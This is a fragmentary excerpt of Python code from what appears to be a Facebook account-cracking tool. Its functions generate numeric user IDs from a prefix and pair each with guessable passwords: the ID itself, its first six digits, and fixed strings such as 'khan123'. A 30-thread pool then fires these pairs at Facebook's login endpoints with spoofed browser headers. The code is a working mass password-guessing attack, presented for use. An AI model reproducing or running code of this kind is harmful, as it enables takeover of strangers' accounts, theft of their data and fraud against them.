...
def ANOX3():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [kode+guru,mk,'5727200','59039200','57575751','khan123']		
			if ANOXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif ANOXfire =='2':yaari.submit(p,uid,pwx,tl)
			elif ANOXfire =='3':yaari.submit(x,uid,pwx,tl)
			elif ANOXfire =='4':yaari.submit(mobile,uid,pwx,tl)
...
def ANOX4():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			...
			mk = uid[:6]
			pwx = [guru]
			pwx = [kode+guru,mk,'5727200','59039200','57575751']
			if ANOXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif ANOXfire =='2':yaari.submit(p,uid,pwx,tl)
			elif ANOXfire =='3':yaari.submit(x,uid,pwx,tl)
			elif ANOXfire =='4':yaari.submit(mobile,uid,pwx,tl)
...
def p(uid,pwx,tl):
    ...
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'referer': 'https://www.facebook.com/business/tools/meta-business-suite?content_id=CgNFIVPUgLLLMiZ&ref=sem_smb&utm_term=fb%20manager%20business&gclid=EAIaIQobChMI_pfhzN65gwMV-KdmAh3KkAqcEAAYASAAEgKxyfD_BwE',
